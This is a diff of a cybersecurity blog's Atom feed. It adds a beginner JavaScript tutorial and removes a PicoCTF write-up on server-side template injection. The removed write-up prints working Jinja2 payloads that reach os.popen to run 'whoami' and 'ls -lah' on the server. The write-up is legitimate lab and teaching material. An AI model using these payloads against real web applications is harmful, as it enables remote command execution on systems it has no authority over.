@@ -1,4 +1,346 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-19T17:54:44-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Memory Forensics</title><link href="http://localhost:4000/blog/memory-forensics/" rel="alternate" type="text/html" title="Memory Forensics" /><published>2025-06-18T00:00:00-04:00</published><updated>2025-06-18T00:00:00-04:00</updated><id>http://localhost:4000/blog/MemoryForensics</id><content type="html" xml:base="http://localhost:4000/blog/memory-forensics/"><![CDATA[<h1 id="what-is-volatility">What Is Volatility</h1>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2025-06-23T08:03:49-04:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Big Brooklyn</title><subtitle>Cybersecurity Blog + Portfolio</subtitle><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><entry><title type="html">Javascript</title><link href="http://localhost:4000/blog/javascript/" rel="alternate" type="text/html" title="Javascript" /><published>2025-06-23T00:00:00-04:00</published><updated>2025-06-23T00:00:00-04:00</updated><id>http://localhost:4000/blog/javascript</id><content type="html" xml:base="http://localhost:4000/blog/javascript/"><![CDATA[<h1 id="javascript-variables">JavaScript Variables</h1>
+<hr />
+
+<p>In JavaScript, variables are used to store and manage data. There are three main ways to declare a variable: <code class="language-plaintext highlighter-rouge">var</code>, <code class="language-plaintext highlighter-rouge">let</code>, and <code class="language-plaintext highlighter-rouge">const</code>.</p>
+
+<h3 id="var-let-and-const">var, let, and const</h3>
+
+<p>Originally, JavaScript only had <code class="language-plaintext highlighter-rouge">var</code>. But in 2015, the release of ECMAScript 6 (also called ES6) introduced <code class="language-plaintext highlighter-rouge">let</code> and <code class="language-plaintext highlighter-rouge">const</code>, giving developers better and safer ways to handle variables.</p>
+
+<p>Here’s a quick breakdown of how each one works:</p>
+
+<p><strong>let</strong>
+Use <code class="language-plaintext highlighter-rouge">let</code> when you need a variable that can be reassigned later in your code. It is block-scoped, which means it’s only available inside the <code class="language-plaintext highlighter-rouge">{}</code> it was defined in, like inside a loop or function.</p>
+
+<p><strong>var</strong>
+<code class="language-plaintext highlighter-rouge">var</code> is function-scoped, not block-scoped. This means it behaves differently inside loops and conditional blocks. It can be updated and re-declared, but it’s more error-prone, which is why most modern JavaScript avoids using it unless necessary. It’s still supported and works in older codebases.</p>
+
+<p><strong>const</strong>
+Use <code class="language-plaintext highlighter-rouge">const</code> when the variable should never be reassigned. Like <code class="language-plaintext highlighter-rouge">let</code>, it’s block-scoped, but it also cannot be updated or re-declared. It’s best used for constants or values that shouldn’t change throughout your code.</p>
+
+<h3 id="understanding-scope">Understanding Scope</h3>
+
+<p><strong>Global Scope</strong>
+If a variable is declared outside of any function or block, it has global scope. This means it can be accessed from anywhere in the code.</p>
+
+<p><strong>Block Scope</strong>
+If a variable is declared inside a block (inside <code class="language-plaintext highlighter-rouge">{}</code>), like within a loop, function, or conditional, and it uses <code class="language-plaintext highlighter-rouge">let</code> or <code class="language-plaintext highlighter-rouge">const</code>, it is block-scoped. This means it only exists within that block and cannot be accessed outside of it.</p>
+
+<h2 id="javascript-data-types-and-operators-for-beginners">JavaScript Data Types and Operators for Beginners</h2>
+
+<p>In JavaScript, a <strong>variable</strong> is like a labeled container that holds different types of data. Before you can use a variable effectively, you need to understand what kinds of data it can store and what you can do with that data.</p>
+
+<h3 id="core-data-types">Core Data Types</h3>
+
+<p>Here are the main types of values you’ll work with:</p>
+
+<p><strong>Number</strong>
+Used for any numeric value, whether it’s a whole number like <code class="language-plaintext highlighter-rouge">42</code> or a decimal like <code class="language-plaintext highlighter-rouge">3.14</code>.</p>
+
+<p><strong>String</strong>
+Text enclosed in quotes, such as <code class="language-plaintext highlighter-rouge">"Matrix"</code> or <code class="language-plaintext highlighter-rouge">'Hello, world'</code>.</p>
+
+<p><strong>Boolean</strong>
+Represents true or false values, useful when making decisions in your code.</p>
+
+<p>There are other types like arrays, objects, <code class="language-plaintext highlighter-rouge">null</code>, and <code class="language-plaintext highlighter-rouge">undefined</code>, but starting with these three gives you a solid foundation.</p>
+
+<h3 id="making-variables-do-something-operators">Making Variables Do Something: Operators</h3>
+
+<p>A variable by itself just holds a value. To do anything useful with it, you’ll need <strong>operators</strong>. These are special symbols used to perform tasks like calculations or comparisons.</p>
+
+<h3 id="arithmetic-operators">Arithmetic Operators</h3>
+
+<p>These are used when working with numbers.</p>
+
+<p><strong>Addition (<code class="language-plaintext highlighter-rouge">+</code>)</strong>
+Adds values together. For example, <code class="language-plaintext highlighter-rouge">10 + 7</code> results in <code class="language-plaintext highlighter-rouge">17</code>.</p>
+
+<p><strong>Subtraction (<code class="language-plaintext highlighter-rouge">-</code>)</strong>
+Subtracts one number from another. <code class="language-plaintext highlighter-rouge">50 - 12</code> gives <code class="language-plaintext highlighter-rouge">38</code>.</p>
+
+<p><strong>Multiplication (<code class="language-plaintext highlighter-rouge">*</code>)</strong>
+Multiplies numbers. <code class="language-plaintext highlighter-rouge">4 * 6</code> gives <code class="language-plaintext highlighter-rouge">24</code>.</p>
+
+<p><strong>Division (<code class="language-plaintext highlighter-rouge">/</code>)</strong>
+Divides one number by another. <code class="language-plaintext highlighter-rouge">20 / 5</code> results in <code class="language-plaintext highlighter-rouge">4</code>.</p>
+
+<p><strong>Modulus (<code class="language-plaintext highlighter-rouge">%</code>)</strong>
+Gives the remainder after division. <code class="language-plaintext highlighter-rouge">14 % 3</code> returns <code class="language-plaintext highlighter-rouge">2</code>.</p>
+
+<p><strong>Increment (<code class="language-plaintext highlighter-rouge">++</code>)</strong>
+Adds 1 to the current value of a variable. If <code class="language-plaintext highlighter-rouge">let score = 8;</code>, then <code class="language-plaintext highlighter-rouge">score++</code> changes it to <code class="language-plaintext highlighter-rouge">9</code>.</p>
+
+<p><strong>Decrement (<code class="language-plaintext highlighter-rouge">--</code>)</strong>
+Subtracts 1 from the current value. If <code class="language-plaintext highlighter-rouge">let count = 5;</code>, then <code class="language-plaintext highlighter-rouge">count--</code> turns it into <code class="language-plaintext highlighter-rouge">4</code>.</p>
+
+<h3 id="comparison-operators">Comparison Operators</h3>
+
+<p>These are used to compare two values and return either true or false.</p>
+
+<p><strong>Equal to (<code class="language-plaintext highlighter-rouge">==</code>)</strong>
+Checks if values are equal, ignoring type. <code class="language-plaintext highlighter-rouge">7 == '7'</code> returns true.</p>
+
+<p><strong>Strictly equal to (<code class="language-plaintext highlighter-rouge">===</code>)</strong>
+Checks if values and types are the same. <code class="language-plaintext highlighter-rouge">7 === '7'</code> returns false.</p>
+
+<p><strong>Not equal to (<code class="language-plaintext highlighter-rouge">!=</code>)</strong>
+Returns true if the values are different. <code class="language-plaintext highlighter-rouge">3 != 9</code> is true.</p>
+
+<p><strong>Not strictly equal to (<code class="language-plaintext highlighter-rouge">!==</code>)</strong>
+Returns true if values or types are different. <code class="language-plaintext highlighter-rouge">3 !== '3'</code> is true.</p>
+
+<p><strong>Greater than (<code class="language-plaintext highlighter-rouge">&gt;</code>)</strong>
+Checks if one value is larger than another. <code class="language-plaintext highlighter-rouge">90 &gt; 45</code> is true.</p>
+
+<p><strong>Less than (<code class="language-plaintext highlighter-rouge">&lt;</code>)</strong>
+Checks if one value is smaller. <code class="language-plaintext highlighter-rouge">2 &lt; 10</code> is true.</p>
+
+<p><strong>Greater than or equal to (<code class="language-plaintext highlighter-rouge">&gt;=</code>)</strong>
+Returns true if the value is larger or equal. <code class="language-plaintext highlighter-rouge">5 &gt;= 5</code> is true.</p>
+
+<p><strong>Less than or equal to (<code class="language-plaintext highlighter-rouge">&lt;=</code>)</strong>
+Returns true if the value is smaller or equal. <code class="language-plaintext highlighter-rouge">4 &lt;= 6</code> is true.</p>
+
+<h3 id="more-to-explore">More to Explore</h3>
+
+<p>JavaScript also has logical operators like <code class="language-plaintext highlighter-rouge">&amp;&amp;</code> (and), <code class="language-plaintext highlighter-rouge">||</code> (or), and <code class="language-plaintext highlighter-rouge">!</code> (not). These are especially useful when you’re combining multiple conditions or writing control flow.</p>
+
+<h1 id="conditionals-in-javascript">Conditionals in JavaScript</h1>
+<hr />
+
+<p>Conditionals let your code make decisions based on whether something is true or false. The most common conditional structure is the <code class="language-plaintext highlighter-rouge">if</code> statement.</p>
+
+<p>Here’s a simple example:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Javascript</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Javascript">
+let temperature = 32;
+
+if (temperature &gt; 30) {
+  console.log("It's hot outside.");
+} else if (temperature &gt; 20) {
+  console.log("It's a nice day.");
+} else {
+  console.log("It's a bit chilly.");
+}
+</code></pre>
+</div>
+
+<h4 id="whats-happening-here">What’s happening here?</h4>
+
+<ul>
+  <li>
+    <p>If the <code class="language-plaintext highlighter-rouge">temperature</code> is greater than 30, it prints “It’s hot outside.”</p>
+  </li>
+  <li>
+    <p>If that first condition isn’t true but the temperature is greater than 20, it prints “It’s a nice day.”</p>
+  </li>
+  <li>
+    <p>If neither condition is true, it defaults to the last message: “It’s a bit chilly.”</p>
+  </li>
+</ul>
+
+<p>This is the basic pattern for conditional logic:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">if</code> checks the first condition</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">else if</code> allows you to check additional conditions</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">else</code> handles everything that didn’t match above</p>
+  </li>
+</ul>
+
+<p>You can combine conditionals with comparison and logical operators to build more complex logic.</p>
+
+<h1 id="switch-statements-in-javascript">switch Statements in JavaScript</h1>
+<hr />
+
+<p>When you have a variable that could match several different values, using a <code class="language-plaintext highlighter-rouge">switch</code> statement can make your code easier to read and maintain.</p>
+
+<h3 id="example-day-of-the-week">Example: Day of the Week</h3>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Javascript</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Javascript">
+let day = "Wednesday";
+
+switch (day) {
+  case "Monday":
+    console.log("Start of the week.");
+    break;
+  case "Wednesday":
+    console.log("Midweek hustle.");
+    break;
+  case "Friday":
+    console.log("Almost the weekend!");
+    break;
+  case "Sunday":
+    console.log("Time to rest.");
+    break;
+  default:
+    console.log("Just another day.");
+}
+</code></pre>
+</div>
+
+<h3 id="whats-going-on-here">What’s going on here?</h3>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">switch</code> checks the value of <code class="language-plaintext highlighter-rouge">day</code></p>
+  </li>
+  <li>
+    <p>Each <code class="language-plaintext highlighter-rouge">case</code> is a value you want to compare it to</p>
+  </li>
+  <li>
+    <p>When a match is found (in this case, “Wednesday”), it runs that block of code</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">break</code> tells JavaScript to stop checking further once a match is found</p>
+  </li>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">default</code> is the fallback if none of the cases match</p>
+  </li>
+</ul>
+
+<h3 id="when-to-use-switch">When to use switch</h3>
+
+<p>Use a <code class="language-plaintext highlighter-rouge">switch</code> when you’re checking <strong>one variable</strong> against <strong>multiple possible values</strong>. It’s not meant for complex comparisons or range checks <code class="language-plaintext highlighter-rouge">if</code> statements are better for that.</p>
+
+<h1 id="functions-in-javascript-es5-vs-es6">Functions in JavaScript: ES5 vs ES6</h1>
+<hr />
+
+<p>In JavaScript, you can write functions a few different ways depending on which version of the language you’re using. ES5 is the older style, and ES6 introduced a more modern and concise syntax called <strong>arrow functions</strong>.</p>
+
+<p>Understanding both styles is important, especially if you’re reading older code or contributing to larger projects.</p>
+
+<h3 id="es5-function-declaration">ES5: Function Declaration</h3>
+
+<p>This is the classic way of defining a function.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Javascript</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Javascript">
+function sayHello(name) {
+  return "Hello, " + name;
+}
+
+let message = sayHello("Trinity");
+console.log(message); // Output: Hello, Trinity
+</code></pre>
+</div>
+
+<h3 id="es5-function-expression">ES5: Function Expression</h3>
+
+<p>In ES5, you could also assign a function to a variable. This is called a function expression.</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Javascript</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Javascript">
+var greet = function(name) {
+  return "Hi, " + name;
+};
+
+console.log(greet("Morpheus")); // Output: Hi, Morpheus
+</code></pre>
+</div>
+
+<p>Notice how the function doesn’t have a name it’s anonymous, and it gets stored inside the greet variable.</p>
+
+<h3 id="es6-arrow-functions">ES6: Arrow Functions</h3>
+
+<p>ES6 introduced a shorter, cleaner syntax using <strong>arrow functions</strong>. It’s widely used in modern JavaScript, especially in React and functional-style code.</p>
+
+<p>Here’s that same example using an arrow function:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Javascript</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Javascript">
+const greet = (name) =&gt; {
+  return "Hi, " + name;
+};
+</code></pre>
+</div>
+<p>If the function has only one parameter and one return statement, you can make it even shorter:</p>
+
+<div class="code-block-container">
+  <span class="code-lang-tag">Javascript</span>
+  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
+    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
+      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
+    </svg>
+  </button>
+  <pre><code class="Javascript">
+const greet = name =&gt; "Hi, " + name;
+</code></pre>
+</div>
+
+<h3 id="key-differences-between-es5-and-es6-functions">Key Differences Between ES5 and ES6 Functions</h3>
+
+<ol>
+  <li>
+    <p><strong>Syntax</strong>
+Arrow functions are more concise and easier to read when doing simple tasks.</p>
+  </li>
+  <li>
+    <p><strong><code class="language-plaintext highlighter-rouge">this</code> Behavior</strong>
+Arrow functions do <strong>not</strong> have their own <code class="language-plaintext highlighter-rouge">this</code> context. They inherit it from the surrounding code. This is a big deal when working with objects, classes, or event listeners.</p>
+  </li>
+  <li>
+    <p><strong>Hoisting</strong>
+Regular function declarations (like in ES5) are hoisted, meaning you can call them before they’re defined. Function expressions and arrow functions are <strong>not</strong> hoisted.</p>
+  </li>
+</ol>
+
+<hr />
+
+<h3 id="when-to-use-what">When to Use What</h3>
+
+<ul>
+  <li>
+    <p>Use <strong>regular functions</strong> (ES5 style) if you need access to <code class="language-plaintext highlighter-rouge">this</code>, like inside object methods or class constructors.</p>
+  </li>
+  <li>
+    <p>Use <strong>arrow functions</strong> for cleaner code in callbacks, array methods (<code class="language-plaintext highlighter-rouge">map</code>, <code class="language-plaintext highlighter-rouge">filter</code>, etc.), and when you don’t need a dynamic <code class="language-plaintext highlighter-rouge">this</code>.</p>
+  </li>
+</ul>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="Redteam" /><category term="pentesting" /><category term="bugbounty" /><category term="ctf" /><summary type="html"><![CDATA[JavaScript Variables]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://wallpapers.com/images/hd/java-script-coffee-mug-space-background-dw830xztu7jr07hu.jpg" /><media:content medium="image" url="https://wallpapers.com/images/hd/java-script-coffee-mug-space-background-dw830xztu7jr07hu.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Memory Forensics</title><link href="http://localhost:4000/blog/memory-forensics/" rel="alternate" type="text/html" title="Memory Forensics" /><published>2025-06-18T00:00:00-04:00</published><updated>2025-06-18T00:00:00-04:00</updated><id>http://localhost:4000/blog/MemoryForensics</id><content type="html" xml:base="http://localhost:4000/blog/memory-forensics/"><![CDATA[<h1 id="what-is-volatility">What Is Volatility</h1>
 <hr />
 
 <p>Volatility is a powerful open source framework for memory forensics. It allows investigators to analyze memory dumps and uncover evidence of system activity, malware behavior, and user actions. The framework is cross platform, modular, and designed for extensibility, making it a staple tool in incident response and forensic investigations.</p>
@@ -5712,48 +6054,4 @@ This overrides any Block Inheritance. Basically says: <em>“No matter what, I r
 
 <p>Some of the settings are pretty self-explanatory. But if you’re unsure what something does, just <strong>double-click it</strong>  and go to the <strong>Explain</strong>  tab. It breaks down what the setting does and how it affects the system.</p>
 
-<p><img src="https://miro.medium.com/v2/resize:fit:408/1*-f4A6SKvl50JXlTaezoT1Q.png" alt="" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><summary type="html"><![CDATA[What is Active Directory? Active Directory is a service developed by Microsoft that helps manage and organize computers, users, and other resources on a network. Think of it like a digital phonebook + control center that stores info about everything in a Windows domain (like usernames, passwords, computers, printers, etc.).]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e0.pxfuel.com/wallpapers/665/369/desktop-wallpaper-cemetery-by-vickie666-for-your-mobile-tablet-explore-graveyard-creepy-graveyard-spooky-graveyard-graveyard-dark-graveyard.jpg" /><media:content medium="image" url="https://e0.pxfuel.com/wallpapers/665/369/desktop-wallpaper-cemetery-by-vickie666-for-your-mobile-tablet-explore-graveyard-creepy-graveyard-spooky-graveyard-graveyard-dark-graveyard.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">SSTI1 (PicoCTF)</title><link href="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1.html" rel="alternate" type="text/html" title="SSTI1 (PicoCTF)" /><published>2025-05-31T00:00:00-04:00</published><updated>2025-05-31T00:00:00-04:00</updated><id>http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1</id><content type="html" xml:base="http://localhost:4000/blog/cybersecurity/2025/05/31/SSTI1.html"><![CDATA[<blockquote>I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!</blockquote>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:613/1*749ohjzhVKocSttt49oQWQ.png" alt="" /></p>
-
-<p>If we type picoCTF, it would show this:</p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:700/1*We7v-m3zd-UQpEYLKxGCFA.png" alt="" /></p>
-
-<p>Let’s try some template injection, in this case we are going to use this <code class="language-plaintext highlighter-rouge">{{7*7}}</code>:</p>
-
-<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection?source=post_page-----0853498698d5---------------------------------------">PayloadsAllTheThings/Server Side Template Injection</a></p>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:700/1*p6nuwKmCpJDW8EQ2qJtakA.png" alt="" /></p>
-
-<p>This time, we got <code class="language-plaintext highlighter-rouge">49</code> because <code class="language-plaintext highlighter-rouge">7 × 7 = 49</code>. That means our injection works. Now, let’s try some more advanced injections.</p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  
-  <pre><code class="language-powershell">{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}</code></pre>
-  
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:700/1*nIEgY-qk-0gDP50LEfcLdQ.png" alt="" /></p>
-
-<div class="code-block-container">
-  <button class="copy-btn" onclick="copyCode(this)" title="Copy code">
-    <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-      <rect x="9" y="9" width="13" height="13" rx="2" ry="2" stroke="currentColor" fill="none" />
-      <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" />
-    </svg>
-  </button>
-  
-  <pre><code class="language-powershell">{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('ls -lah').read() }}</code></pre>
-  
-</div>
-
-<p><img src="https://miro.medium.com/v2/resize:fit:700/1*ppTGzKKyJ-A80GgxnjNRNg.png" alt="" /></p>
-
-<p>Now we can read the flag.</p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><category term="bug bounty" /><category term="ctf" /><summary type="html"><![CDATA[I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps!]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e0.pxfuel.com/wallpapers/813/865/desktop-wallpaper-dark-evil-horror-spooky-creepy-scary-scary-for-your-mobile-tablet-explore-scary-creepy-creepy-creepy-halloween-background-creepy-clown-2560x1440-dark.jpg" /><media:content medium="image" url="https://e0.pxfuel.com/wallpapers/813/865/desktop-wallpaper-dark-evil-horror-spooky-creepy-scary-scary-for-your-mobile-tablet-explore-scary-creepy-creepy-creepy-halloween-background-creepy-clown-2560x1440-dark.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
+<p><img src="https://miro.medium.com/v2/resize:fit:408/1*-f4A6SKvl50JXlTaezoT1Q.png" alt="" /></p>]]></content><author><name>Big Brooklyn</name><email>you@protonmail.com</email></author><category term="blog" /><category term="cybersecurity" /><category term="red team" /><category term="pentesting" /><summary type="html"><![CDATA[What is Active Directory? Active Directory is a service developed by Microsoft that helps manage and organize computers, users, and other resources on a network. Think of it like a digital phonebook + control center that stores info about everything in a Windows domain (like usernames, passwords, computers, printers, etc.).]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://e0.pxfuel.com/wallpapers/665/369/desktop-wallpaper-cemetery-by-vickie666-for-your-mobile-tablet-explore-graveyard-creepy-graveyard-spooky-graveyard-graveyard-dark-graveyard.jpg" /><media:content medium="image" url="https://e0.pxfuel.com/wallpapers/665/369/desktop-wallpaper-cemetery-by-vickie666-for-your-mobile-tablet-explore-graveyard-creepy-graveyard-spooky-graveyard-graveyard-dark-graveyard.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>
